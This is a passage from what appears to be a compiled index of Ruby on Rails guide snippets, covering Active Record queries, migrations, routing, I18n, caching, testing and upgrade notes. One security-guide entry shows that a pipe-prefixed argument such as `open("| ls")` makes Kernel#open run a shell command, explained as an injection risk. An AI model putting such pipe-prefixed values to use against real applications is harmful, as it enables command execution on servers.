ruby\nCODE:\n```\n# Configure static asset server for tests with Cache-Control for performance\nconfig.serve_static_assets = true\nconfig.static_cache_control = \"public, max-age=3600\"\n```\n\n----------------------------------------\n\nTITLE: Lowercasing the First Letter of a String in Ruby\nDESCRIPTION: This snippet illustrates the use of `downcase_first` method to convert the first letter of a string to lowercase. This is part of the ActiveSupport core extension to the String class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_91\n\nLANGUAGE: ruby\nCODE:\n```\n\"If I had read Alice in Wonderland\".downcase_first # => \"if I had read Alice in Wonderland\"\n\"\".downcase_first                                  # => \"\"\n```\n\n----------------------------------------\n\nTITLE: YAML Fixture with Associations - Articles\nDESCRIPTION: This YAML fixture defines an article named 'first' that belongs to the 'web_frameworks' category. It demonstrates how to set up a `belongs_to` association using fixture names.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_25\n\nLANGUAGE: yaml\nCODE:\n```\n# test/fixtures/articles.yml\nfirst:\n  title: Welcome to Rails!\n  category: web_frameworks\n```\n\n----------------------------------------\n\nTITLE: In Stock Text Email Template (ERB)\nDESCRIPTION: This code snippet defines the text content for the `in_stock` email. It includes a message and the URL of the product page.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_109\n\nLANGUAGE: erb\nCODE:\n```\nGood news!\n\n<%= @product.name %> is back in stock.\n<%= product_url(@product) %>\n```\n\n----------------------------------------\n\nTITLE: Dasherizing Strings\nDESCRIPTION: Shows the `dasherize` method, which replaces underscores with dashes in a string. This is often used for generating URL-friendly strings.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_74\n\nLANGUAGE: ruby\nCODE:\n```\n\"name\".dasherize         # => \"name\"\n\"contact_data\".dasherize # => \"contact-data\"\n```\n\n----------------------------------------\n\nTITLE: Active Record Join Table Conditions with Hash\nDESCRIPTION: Example demonstrating how to specify conditions on join tables using hash syntax in Active Record queries.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_2_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass Photo < ActiveRecord::Base\n  belongs_to :product\nend\n\nclass Product < ActiveRecord::Base\n  has_many :photos\nend\n\n# Get all products with copyright-free photos:\nProduct.all(:joins => :photos, :conditions => { :photos => { :copyright => false }})\n```\n\n----------------------------------------\n\nTITLE: Wildcard Template Dependency Declaration\nDESCRIPTION: This example demonstrates how to use a wildcard to declare multiple template dependencies in a directory. This is useful in cases like Single Table Inheritance (STI) setups.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_19\n\nLANGUAGE: html\nCODE:\n```\n<%# Template Dependency: events/* %>\n<%= render_categorizable_events @person.events %>\n```\n\n----------------------------------------\n\nTITLE: Creating Products Table (Ruby)\nDESCRIPTION: This migration creates a `products` table with columns for `name` (string), `description` (text), and timestamps.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_21\n\nLANGUAGE: Ruby\nCODE:\n```\nclass CreateProducts < ActiveRecord::Migration[8.1]\n  def change\n    create_table :products do |t|\n      t.string :name\n      t.text :description\n\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Equality Condition with Association in Rails\nDESCRIPTION: Demonstrates how to query based on a `belongs_to` association, using an Active Record object as the value.  Also shows how to use this in a join.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_61\n\nLANGUAGE: ruby\nCODE:\n```\nauthor = Author.first\nBook.where(author: author)\nAuthor.joins(:books).where(books: { author: author })\n```\n\n----------------------------------------\n\nTITLE: Example of Rails Application Credentials Format\nDESCRIPTION: Sample structure of encrypted credentials in YAML format, containing secret keys and API credentials that can be accessed securely through the Rails application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_77\n\nLANGUAGE: yaml\nCODE:\n```\nsecret_key_base: 3b7cd72...\nsome_api_key: SOMEKEY\nsystem:\n  access_key_id: a1234AB\n```\n\n----------------------------------------\n\nTITLE: find_by using where and take\nDESCRIPTION: This code demonstrates the equivalent Ruby code for `find_by` using `where` and `take`. It provides an alternative implementation for finding a record by a specific attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(first_name: \"Lifo\").take\n```\n\n----------------------------------------\n\nTITLE: Output of Database Migration\nDESCRIPTION: This code block is not code, but terminal output describing the actions taken when running a Rails database migration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_18\n\nLANGUAGE: bash\nCODE:\n```\n== 20240426151900 CreateProducts: migrating ===================================\n-- create_table(:products)\n   -> 0.0030s\n== 20240426151900 CreateProducts: migrated (0.0031s) ==========================\n```\n\n----------------------------------------\n\nTITLE: Configuring Routes for an Internationalized Rails Application\nDESCRIPTION: Basic routes configuration for a Rails application with internationalization support, setting up the root route to point to the home controller's index action.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\n# config/routes.rb\nRails.application.routes.draw do\n  root to: \"home#index\"\nend\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for NOT Condition in Rails\nDESCRIPTION: Shows the SQL generated by the `where.not` example, using the `NOT IN` operator to exclude records where `orders_count` is one of the listed values.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_71\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers WHERE (customers.orders_count NOT IN (1,3,5))\n```\n\n----------------------------------------\n\nTITLE: Replacing Monochrome with Colourspace in Ruby on Rails Active Storage\nDESCRIPTION: This snippet shows how to update the method for creating monochrome images when migrating from ImageMagick to Vips in Rails Active Storage.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_24\n\nLANGUAGE: diff\nCODE:\n```\n- variant(monochrome: true)\n+ variant(colourspace: \"b-w\")\n```\n\n----------------------------------------\n\nTITLE: Association with Custom Options\nDESCRIPTION: Example demonstrating how to customize association behavior using options like touch and counter_cache. These options modify how the association interacts with the related model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_107\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :author, touch: :books_updated_at,\n    counter_cache: true\nend\n```\n\n----------------------------------------\n\nTITLE: Running Rails Tests in CI\nDESCRIPTION: This command shows how to run all tests in a Continuous Integration (CI) environment using `bin/rails test`. It also highlights how to include system tests by using `bin/rails test:system` or `bin/rails test:all`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_111\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test\n```\n\n----------------------------------------\n\nTITLE: Rails Model Test Skeleton Ruby\nDESCRIPTION: Presents the generated model test file structure in Rails.  The file inherits from `ActiveSupport::TestCase` and provides a template for adding model-specific tests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\n# article_test.rb\nrequire \"test_helper\"\n\nclass ArticleTest < ActiveSupport::TestCase\n  # test \"the truth\" do\n  #   assert true\n  # end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Session Store in Rails\nDESCRIPTION: This example shows how to configure a custom session store in Rails by using a symbol. This will be resolved to the `ActionDispatch::Session` namespace, making `ActionDispatch::Session::MyCustomStore` the active session store.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\n# use ActionDispatch::Session::MyCustomStore as the session store\nconfig.session_store :my_custom_store\n```\n\n----------------------------------------\n\nTITLE: Resetting has_one Association Cache - Ruby\nDESCRIPTION: Clears the cached Account association for the Supplier. The next access to .account will query the database anew. No return value; modifies association state in memory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\n@supplier.reset_account\n```\n\n----------------------------------------\n\nTITLE: Strong Parameters - Permit Method\nDESCRIPTION: Illustrates the `permit` method for whitelisting parameters in Rails. It explains how to permit scalar values, arrays, and hashes for mass assignment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nparams = ActionController::Parameters.new(id: 1, admin: \"true\")\nparams.permit(:id)\nparams.permit(:id, :admin)\n```\n\nLANGUAGE: ruby\nCODE:\n```\nparams = ActionController::Parameters.new(tags: [\"rails\", \"parameters\"])\nparams.permit(tags: [])\n```\n\nLANGUAGE: ruby\nCODE:\n```\nparams = ActionController::Parameters.new(options: { darkmode: true })\nparams.permit(options: {})\n```\n\n----------------------------------------\n\nTITLE: Enabling Caching in Development - Bash\nDESCRIPTION: This command enables caching in the development environment for a Rails application. It configures the application to use the cache store and allows for testing caching strategies during development.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_77\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails dev:cache\n```\n\n----------------------------------------\n\nTITLE: Example of Clashing Named Routes in Rails 4.0\nDESCRIPTION: Demonstration of clashing named routes that will raise ArgumentError in Rails 4.0. Shows two different routes defined with the same name 'example'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_94\n\nLANGUAGE: ruby\nCODE:\n```\nget \"one\" => \"test#example\", as: :example\nget \"two\" => \"test#example\", as: :example\n```\n\n----------------------------------------\n\nTITLE: Running Rails Template with New Application\nDESCRIPTION: Command to generate a new Rails application using a template file. The -m option specifies the path to the template file that will be executed during application generation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_26\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new my_cool_app -m path/to/template.rb\n```\n\n----------------------------------------\n\nTITLE: Truncate String with Omission\nDESCRIPTION: This snippet demonstrates how to truncate a string to a specified length, adding an omission string at the end. The length calculation considers the length of the omission string. The default omission is '...'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\n\"Oh dear! Oh &hellip;\"\n```\n\n----------------------------------------\n\nTITLE: Sharding Solid Cache Configuration in database.yml\nDESCRIPTION: This snippet demonstrates configuring sharding for Solid Cache by defining multiple cache databases in the `config/database.yml` file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_28\n\nLANGUAGE: yaml\nCODE:\n```\n# config/database.yml\nproduction:\n  cache_shard1:\n    database: cache1_production\n    host: cache1-db\n  cache_shard2:\n    database: cache2_production\n    host: cache2-db\n  cache_shard3:\n    database: cache3_production\n    host: cache3-db\n```\n\n----------------------------------------\n\nTITLE: Adding New Action Route to Resources - Ruby\nDESCRIPTION: This snippet demonstrates how to add a new action route to the `comments` resource. It adds a `preview` action on new that operates on the a new comment. The generated route is `/comments/new/preview`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\nresources :comments do\n  get \"preview\", on: :new\nend\n```\n\n----------------------------------------\n\nTITLE: Generating a Mailer with a Specific Method\nDESCRIPTION: Shows how to use the Rails generator to create a mailer class with a specific method already defined, in this case UserMailer with welcome_email method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate mailer User welcome_email\n```\n\n----------------------------------------\n\nTITLE: Example of Correct Article Usage with SQL in Documentation\nDESCRIPTION: Demonstrates the proper use of the article \"an\" with \"SQL\" in documentation text. Shows correct examples for SQL and SQLite references.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\n# BAD\n# Creates a SQL statement.\n# Starts a SQLite database.\n\n# GOOD\n# Creates an SQL statement.\n# Starts an SQLite database.\n```\n\n----------------------------------------\n\nTITLE: Creating a Join Table in Rails\nDESCRIPTION: This code snippet demonstrates how to create a join table in Rails using the `create_join_table` method. It creates a `categories_products` table with `category_id` and `product_id` columns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\ncreate_join_table :products, :categories\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Changes in ActionDispatch::Response#content_type\nDESCRIPTION: This Ruby code demonstrates the change in behavior of ActionDispatch::Response#content_type in Rails 6. It now returns the full Content-Type header including the charset.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nresp = ActionDispatch::Response.new(200, \"Content-Type\" => \"text/csv; header=present; charset=utf-16\")\nresp.content_type #=> \"text/csv; header=present; charset=utf-16\"\nresp.media_type   #=> \"text/csv\"\n```\n\n----------------------------------------\n\nTITLE: Resource Route Conflict Example in Rails 4.0\nDESCRIPTION: Example of how resources method can create routes that clash with explicitly defined named routes, causing ArgumentError in Rails 4.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_95\n\nLANGUAGE: ruby\nCODE:\n```\nresources :examples\nget \"clashing/:id\" => \"test#example\", as: :example\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Storage to Use Proxy Mode in Rails\nDESCRIPTION: Demonstrates how to configure Active Storage to use proxy mode by default, which makes application servers download file data from storage services in response to requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/active_storage.rb\nRails.application.config.active_storage.resolve_model_to_route = :rails_storage_proxy\n```\n\n----------------------------------------\n\nTITLE: Setting Content Type in Rails Rendering\nDESCRIPTION: This snippet shows how to set the content type of the response when rendering a template in Rails. The `:content_type` option is used to specify the desired MIME type.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nrender template: \"feed\", content_type: \"application/rss\"\n```\n\n----------------------------------------\n\nTITLE: Reversible Rails Migration Example\nDESCRIPTION: Shows how to create reversible migrations using the change method instead of up/down methods\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nclass MyMigration < ActiveRecord::Migration\n  def change\n    create_table(:horses) do |t|\n      t.column :content, :text\n      t.column :remind_at, :datetime\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Running Tests for Ruby on Rails Plugin\nDESCRIPTION: This bash command shows how to run the tests for the Rails plugin and displays the expected output indicating successful test execution.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_25\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/test\n...\n6 runs, 6 assertions, 0 failures, 0 errors, 0 skips\n```\n\n----------------------------------------\n\nTITLE: Kernel#open Command Injection Vulnerability in Ruby\nDESCRIPTION: Demonstrates how Kernel#open can execute OS commands when the argument starts with a pipe character, creating a potential security risk.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_57\n\nLANGUAGE: ruby\nCODE:\n```\nopen(\"| ls\") { |file| file.read }\n# returns file list as a String via `ls` command\n```\n\n----------------------------------------\n\nTITLE: Sample JSON Response from Rails API Endpoint\nDESCRIPTION: Example of JSON data returned by the '/groups.json' endpoint, showing the structure of the API response for Group records.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n[\n{\"id\":1, \"name\":\"Rails Founders\", \"created_at\": ...},\n{\"id\":2, \"name\":\"Rails Contributors\", \"created_at\": ...}\n]\n```\n\n----------------------------------------\n\nTITLE: Many-to-Many Association Setup in Rails\nDESCRIPTION: Example of setting up many-to-many relationships using has_many :through between Physician and Patient models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\nclass Physician < ApplicationRecord\n  has_many :appointments\n  has_many :patients, through: :appointments\nend\n\nclass Appointment < ApplicationRecord\n  belongs_to :physician\n  belongs_to :patient\nend\n\nclass Patient < ApplicationRecord\n  has_many :appointments\n  has_many :physicians, through: :appointments\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Test Environment for Rails 3.1\nDESCRIPTION: This snippet shows the configuration settings for the test environment in Rails 3.1, focusing on static asset serving for performance testing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_107\n\nLANGUAGE: ruby\nCODE:\n```\n# Configure static asset server for tests with Cache-Control for performance\nconfig.public_file_server.enabled = true\nconfig.public_file_server.headers = {\n  \"Cache-Control\" => \"public, max-age=3600\"\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Collection Route to Resources - Ruby\nDESCRIPTION: This snippet demonstrates how to add a collection route to the `photos` resource. It adds a `search` action that operates on the collection of photos. The generated route is `/photos/search`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\nresources :photos do\n  collection do\n    get \"search\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Transaction Callback Registration in Ruby on Rails\nDESCRIPTION: Demonstrates how to register transaction callbacks using the new ActiveRecord::Transaction object, including after_commit hooks for transaction completion.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_2_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nArticle.transaction do |transaction|\n  article.update(published: true)\n\n  transaction.after_commit do\n    PublishNotificationMailer.with(article: article).deliver_later\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Custom Shard Resolver Using Subdomain\nDESCRIPTION: An example of a custom shard resolver function that determines the appropriate database shard based on the subdomain of the incoming request.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.shard_resolver = ->(request) {\n  subdomain = request.subdomain\n  tenant = Tenant.find_by_subdomain!(subdomain)\n  tenant.shard\n}\n```\n\n----------------------------------------\n\nTITLE: Including ActiveModel::API in a Model\nDESCRIPTION: This snippet shows how to include `ActiveModel::API` in a model. `ActiveModel::API` provides a lightweight implementation of Active Model concerns, suitable for use in non-Active Record models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person\n  include ActiveModel::API\nend\n```\n\n----------------------------------------\n\nTITLE: SQL Query Selecting Multiple Columns (SQL)\nDESCRIPTION: This SQL query selects multiple columns (`title`, `isbn`, and `created_at`) from the `books` table, showcasing the result of using multiple `select` methods.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_112\n\nLANGUAGE: sql\nCODE:\n```\nSELECT books.title, books.isbn, books.created_at FROM books\n```\n\n----------------------------------------\n\nTITLE: Rails Notes Command Output\nDESCRIPTION: Examples of using the Rails notes command to find annotations in code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails notes\napp/controllers/admin/users_controller.rb:\n  * [ 20] [TODO] any other way to do this?\n  * [132] [FIXME] high priority for next deploy\n\nlib/school.rb:\n  * [ 13] [OPTIMIZE] refactor this code to make it faster\n  * [ 17] [FIXME]\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails notes --annotations FIXME RELEASE\napp/controllers/admin/users_controller.rb:\n  * [101] [RELEASE] We need to look at this before next release\n  * [132] [FIXME] high priority for next deploy\n\nlib/school.rb:\n  * [ 17] [FIXME]\n```\n\n----------------------------------------\n\nTITLE: Example Cache Write Payload in ActiveSupport\nDESCRIPTION: Example of a payload structure for cache_write.active_support event showing the key being written and the cache store class being used.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  key: \"name-of-complicated-computation\",\n  store: \"ActiveSupport::Cache::MemCacheStore\"\n}\n```\n\n----------------------------------------\n\nTITLE: Mounting Engine Routes in Rails Test Environment\nDESCRIPTION: Configuration for mounting a Blorgh engine at /blorgh path in the test dummy application's routes file\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.routes.draw do\n  mount Blorgh::Engine => \"/blorgh\"\nend\n```\n\n----------------------------------------\n\nTITLE: Checking Authentication Status in Rails Views with ERB\nDESCRIPTION: This snippet demonstrates how to conditionally display authentication-related elements in a Rails view based on the user's authentication status using the 'authenticated?' helper method from the Authentication concern.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_6\n\nLANGUAGE: html+erb\nCODE:\n```\n<% if authenticated? %>\n  <%= button_to \"Sign Out\", session_path, method: :delete  %>\n<% else %>\n  <%= link_to \"Sign In\", new_session_path %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Current Transaction Callback in Ruby on Rails\nDESCRIPTION: Shows how to register callbacks on the current transaction using ActiveRecord::Base.current_transaction.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_2_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nArticle.current_transaction.after_commit do\n  PublishNotificationMailer.with(article: article).deliver_later\nend\n```\n\n----------------------------------------\n\nTITLE: SQL Equivalent: Find Customer by Composite ID\nDESCRIPTION: SQL query equivalent to the ActiveRecord `Customer.find([3, 17])` call.  This shows the SQL generated when using a composite primary key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_11\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers WHERE store_id = 3 AND id = 17\n```\n\n----------------------------------------\n\nTITLE: Basic Translation Lookup in Ruby\nDESCRIPTION: Demonstrates basic translation lookup using symbols and strings with the I18n.t method\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nI18n.t :message\nI18n.t \"message\"\n```\n\n----------------------------------------\n\nTITLE: SQL Query with Reordered Books (SQL)\nDESCRIPTION: These SQL queries represent the queries executed after applying the `reorder` method. The books are now ordered by `year_published` in ascending order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_116\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM authors WHERE id = 10 LIMIT 1\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE author_id = 10 ORDER BY year_published ASC\n```\n\n----------------------------------------\n\nTITLE: Default HTTP Headers Configuration in Rails 4.0\nDESCRIPTION: Rails 4.0 allows configuration of HTTP headers through default_headers. The example shows the default security headers that are set.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_99\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_dispatch.default_headers = {\n  \"X-Frame-Options\" => \"SAMEORIGIN\",\n  \"X-XSS-Protection\" => \"1; mode=block\"\n}\n```\n\n----------------------------------------\n\nTITLE: Excluding Elements with excluding/without in Ruby\nDESCRIPTION: This snippet demonstrates the `excluding` (aliased as `without`) method. It returns a copy of the enumerable with the specified elements removed.  Defined in `active_support/core_ext/enumerable.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_115\n\nLANGUAGE: ruby\nCODE:\n```\n[\"David\", \"Rafael\", \"Aaron\", \"Todd\"].excluding(\"Aaron\", \"Todd\") # => [\"David\", \"Rafael\"]\n```\n\n----------------------------------------\n\nTITLE: Enabling Streaming in Rails Controller\nDESCRIPTION: Shows how to enable streaming support in a Rails controller using the stream method. Can be restricted to specific actions using :only or :except options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nclass PostsController < ActionController::Base\n  stream\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Test Case Class (Ruby)\nDESCRIPTION: This defines a test case class named 'ArticleTest' that inherits from 'ActiveSupport::TestCase'. This inheritance provides access to various testing methods and assertions provided by Rails. All tests for the Article model will be defined within this class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_4\n\nLANGUAGE: Ruby\nCODE:\n```\nclass ArticleTest < ActiveSupport::TestCase\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Removing a Reference\nDESCRIPTION: This code removes a reference column using `remove_reference`. It removes the `user_id` column from the `products` table and also removes the foreign key constraint and the index.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\nremove_reference :products, :user, foreign_key: true, index: false\n```\n\n----------------------------------------\n\nTITLE: Using content_tag_for with Collections in Rails Views (Ruby)\nDESCRIPTION: Demonstrates the new ability to use content_tag_for with a collection of records in Rails views, simplifying iteration over multiple items.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\ncontent_tag_for(:li, @items) do |item|\n  Title: <%= item.title %>\nend\n```\n\n----------------------------------------\n\nTITLE: Accessing Loaded Configuration Values in Rails\nDESCRIPTION: This snippet shows how to access configuration values loaded from a YAML file using `Rails::Application.config_for`. It accesses the `merchant_id` value from the `payment` configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_116\n\nLANGUAGE: ruby\nCODE:\n```\nRails.configuration.payment[\"merchant_id\"] # => production_merchant_id or development_merchant_id\n```\n\n----------------------------------------\n\nTITLE: Setting Relative URL Root (Ruby)\nDESCRIPTION: This Ruby snippet demonstrates how to set the `relative_url_root` configuration option in a Rails application. This is used when deploying the application to a subdirectory of the domain root, allowing Rails to generate the appropriate routes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_102\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.relative_url_root = \"/app1\"\n```\n\n----------------------------------------\n\nTITLE: Defining an Active Job class in Ruby on Rails\nDESCRIPTION: This snippet demonstrates how to define a job class using Active Job in Rails 4.2. It shows how Active Record objects can be passed as arguments without serialization concerns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_2_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nclass TrashableCleanupJob < ActiveJob::Base\n  def perform(trashable, depth)\n    trashable.cleanup(depth)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Demonstrating a Deadlock Scenario in Ruby Rails\nDESCRIPTION: This snippet shows a scenario where a deadlock can occur due to autoloading and thread execution in Rails. It illustrates how the outer thread holds the 'running' lock while waiting for the inner thread, which cannot load the User constant.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/threading_and_code_execution.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.executor.wrap do\n  th = Thread.new do\n    Rails.application.executor.wrap do\n      User # inner thread waits here; it cannot load\n           # User while another thread is running\n    end\n  end\n\n  th.join # outer thread waits here, holding 'running' lock\nend\n```\n\n----------------------------------------\n\nTITLE: Scoped Translation Lookup\nDESCRIPTION: Shows different ways to lookup translations using scopes and namespaces\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\nI18n.t :record_invalid, scope: [:activerecord, :errors, :messages]\nI18n.translate \"activerecord.errors.messages.record_invalid\"\nI18n.t \"errors.messages.record_invalid\", scope: :activerecord\nI18n.t :record_invalid, scope: \"activerecord.errors.messages\"\nI18n.t :record_invalid, scope: [:activerecord, :errors, :messages]\n```\n\n----------------------------------------\n\nTITLE: Date calculations with beginning_of_year and end_of_year in Ruby\nDESCRIPTION: These methods return the dates for the beginning and end of the year.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_147\n\nLANGUAGE: ruby\nCODE:\n```\nd = Date.new(2010, 5, 9) # => Sun, 09 May 2010\nd.beginning_of_year      # => Fri, 01 Jan 2010\nd.end_of_year            # => Fri, 31 Dec 2010\n```\n\n----------------------------------------\n\nTITLE: Defining a Rich Text Attribute in a Model\nDESCRIPTION: This Ruby code adds the `has_rich_text` class method to the `Article` model, associating the `content` attribute with the `action_text_rich_texts` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/article.rb\nclass Article < ApplicationRecord\n  has_rich_text :content\nend\n```\n\n----------------------------------------\n\nTITLE: Customizing Solid Cache Store Options in cache.yml\nDESCRIPTION: This snippet demonstrates customizing Solid Cache store options such as `max_age` and `max_size` in the `config/cache.yml` file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_27\n\nLANGUAGE: yaml\nCODE:\n```\ndefault: &default\n  store_options:\n    # Cap age of oldest cache entry to fulfill retention policies\n    max_age: <%= 